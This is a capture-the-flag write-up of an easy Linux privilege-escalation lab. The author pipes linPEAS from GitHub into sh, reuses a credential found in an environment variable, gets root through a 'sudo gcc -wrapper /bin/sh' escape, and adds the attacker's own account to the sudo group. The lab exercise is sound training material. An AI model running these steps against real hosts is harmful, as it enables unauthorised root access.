# CTF Writeup:  Town Pulse

## Challenge Overview
* **Category:** OS Exploitation
* **Difficulty:** ["Easy"]
* **Description:** We have access to a linux box, need to find vulnerable configuration to escalate privileges and find flag. 


## Tools Used

- [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [GTFOBins](https://gtfobins.github.io/)
- bash

---

## Solution

Usual disclaimer here: the following solution was the one that worked and there was some trial and error to find it. Omitting those dead-ends for brevity.  

### Step 1: Initial Access

```bash
ssh Pentester@<ip>
ssh: connect to host <ip> port 22: Connection refused
```

Ah, ok, why tho? Let's check what ports are open and services running:

```bash
nmap -sV <ip>
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-29 15:19 AEDT
Nmap scan report for <ip>
Host is up (0.11s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.95 seconds
 
```

Switching ports.

```bash
ssh -p 2222 Pentester@<ip>
```


Challenge requires privilege escalation so let's go script kiddie and fetch a tool to search for that "privesc" as it's call in "the biz".

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
  0  805k    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |
    |---------------------------------------------------------------------------------|
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |
    |         Follow on Twitter         :     @hacktricks_live                        |
    |         Respect on HTB            :     SirBroccoli                             |
    |---------------------------------------------------------------------------------|
    |                                 Thank you!                                      |
    \---------------------------------------------------------------------------------/
          LinPEAS-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

```

... etc etc ... 

```bash
╔══════════╣ Environment
╚ Any private information inside environment variables?  
HOME=/home/Pentester 
LOGNAME=Pentester
JOAN_TEMPORARY_CREDS=jojocreds1
```
 
Well well well. For reasons mysterious there are temp creds for another user in the environment variables of our account. 

Let's try SSHing into their account and see what permissions they have. Fingers crossed they're in `sudo` group and we can use their privilege to escalate ours **sinister laugh**. 

What's our target account though? 

```bash
ls /home
Joan  Pelski  Pentester  Shedra  user
```

Spoiler alert: it's the Joan account. Let's try to ssh into their account with the creds. 

```bash

ssh Joan@localhost 
Joan@localhost's password: <enter creds>
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Nov 28 22:51:34 2024 from 127.0.0.1

```

**lowers sunglasses** We're in!

---

### Step 2: Priv Esc

See what groups Joan's in.

```bash
groups
Joan sudo
```

Good, good, now let's add our pentester account to sudoers.

```bash
sudo usermod -aG sudo Pentester
Sorry, user Joan is not allowed to execute '/usr/sbin/usermod -aG sudo Pentester' as root on dad5f987a15f."
```

Blerg! Rubbing the brow here as I was heading for a PB for unfinished challenges in this event. Thankfully team-work makes the dream work and I looked to the east for a teammate wizard saviour.

![image](./gandalf-white.gif)

Thanks wizard teammate 🧙 10 seconds, one command, and a URL later. 

The command which shows the commands they can run as sudo.

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/gcc
```

The URL with ways to exploit that: https://gtfobins.github.io/gtfobins/gcc#sudo

Doopdeedoop, let's try that GTOFbin command now.

```bash
sudo gcc -wrapper /bin/sh,-s .
# whoami
root
# 
```

😍 

Now we can give our Pentester account sudo powers.

```bash
sudo usermod -aG sudo Pentester
exit
exit
exit
```

There we logged out of root, Joan, and Pentester, then sshed back in to the latter and to apply the new group memberships. Check those.

```bash
ssh -p 2222 Pentester@<ip>
groups
Pentester sudo
```

Huzzah! Now what commands can we run as sudo?

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/gcc
```

Interesting this one, as the commands are limited to those Joan had. Wasn't expecting that. 

Run that GTFOBin again with our account

```bash
Pentester@host:~$ sudo gcc -wrapper /bin/sh,-s .
# whoami
root
# 
```

Privilege escalated.

---

### Step 3: Flag Retrieval

Now the flag's gotta be here somewhere, normally I use `find` (looking for flag.txt) or `grep` (looking for string FLAG within a file) on the entire file system. Trying find first 

```bash
# find / -name flag.txt -type f
/root/flag.txt
```

Then

```bash
# cat /root/flag.txt
FLAG{7H15_SUDO_C00K3D_R007}
```

![image](./victory.gif)


---

## Reflections

- Ask teammates for help when you get blocked. Difficult for you can be easy for them and vice versa. 
- As a team, set up some tools in comms (like a thread for each challenge) to share progress and artefacts for challenges so someone can pick up from where someone else is stuck.
- Linpeas and gftobins are l337h4x0r was to privesc on linux. 🫶

---


